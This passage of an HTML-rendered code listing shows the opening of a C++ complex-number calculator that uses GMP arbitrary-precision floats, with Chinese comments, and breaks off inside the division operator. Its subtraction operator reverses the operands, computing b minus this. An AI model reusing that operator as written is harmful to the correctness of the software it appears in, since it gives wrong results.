class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;gmpxx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span><span class="comment">//运用到C++的栈和队列</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountEr</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BlankFliter</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ModTraslate</span><span class="params">(string &amp;buf)</span></span>;<span class="comment">//转换模，转换科学计数法，转换共轭复数  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ConTraslate</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ETraslate</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">NameCheck</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">NameTraslate</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">AdjustResult</span><span class="params">(<span class="type">int</span> exp,string &amp;buf)</span></span>;</span><br><span class="line"><span class="function">string <span class="title">MpfAdjustResult</span><span class="params">(<span class="type">int</span> exp,string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckImga</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WhoFirst</span><span class="params">(<span class="type">char</span> op)</span></span>;</span><br><span class="line"><span class="type">bool</span> Invalid=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;string,string&gt;umap&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Out_State=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Complex一个浮点类，一个整数类，可以用函数模板，对一些必要的操作进行重载.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:<span class="comment">//也设立两个负数的flag</span></span><br><span class="line">        <span class="type">mpf_t</span> realPart;<span class="comment">//实</span></span><br><span class="line">        <span class="type">mpf_t</span> imaginaryPart;<span class="comment">//虚</span></span><br><span class="line">    <span class="built_in">Complex</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(imaginaryPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(realPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_set_ui</span>(realPart,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">mpf_set_ui</span>(imaginaryPart,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Complex</span>(<span class="type">mpf_t</span> initx,<span class="type">mpf_t</span> inity)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(imaginaryPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(realPart,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_set</span>(realPart,initx);</span><br><span class="line">        <span class="built_in">mpf_set</span>(imaginaryPart,inity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">getx</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,realPart);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">gety</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,imaginaryPart);</span><br><span class="line">    &#125;</span><br><span class="line">    Complex &amp; <span class="keyword">operator</span>=(Complex b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpf_set</span>(<span class="keyword">this</span>-&gt;realPart,b.realPart);</span><br><span class="line">        <span class="built_in">mpf_set</span>(<span class="keyword">this</span>-&gt;imaginaryPart,b.imaginaryPart);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>+(Complex b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        <span class="built_in">mpf_add</span>(result.realPart,b.realPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">mpf_add</span>(result.imaginaryPart,b.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>-(Complex b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        <span class="built_in">mpf_sub</span>(result.realPart,b.realPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">mpf_sub</span>(result.imaginaryPart,b.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>*(Complex b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        <span class="type">mpf_t</span> ac,bd,bc,ad;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(ac,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(bd,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(bc,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(ad,<span class="number">333</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_mul</span>(ac,b.realPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(bd,b.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(bc,b.realPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(ad,b.imaginaryPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">mpf_sub</span>(result.realPart,ac,bd);</span><br><span class="line">        <span class="built_in">mpf_add</span>(result.imaginaryPart,bc,ad);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>/(Complex b) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        <span class="type">mpf_t</span> ac,bd,bc,ad;</span><br><span class="line">        <span class="type">mpf_t</span> temp1,temp2;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_init2</span>(ac,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(bd,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(bc,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(ad,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(temp1,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(temp2,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(ac,b.realPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(bd,b.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(bc,b.realPart,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        <span class="built_in">mpf_mul</span>(ad,b.imaginaryPart,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//(a+bi)/(c+di)=(ac + bd)/(c^2 + d ^2) +((bc - ad)/(c ^2 + d ^2)) i</span></span><br><span class="line">        <span class="built_in">mpf_pow_ui</span>(temp1,b.realPart,<span 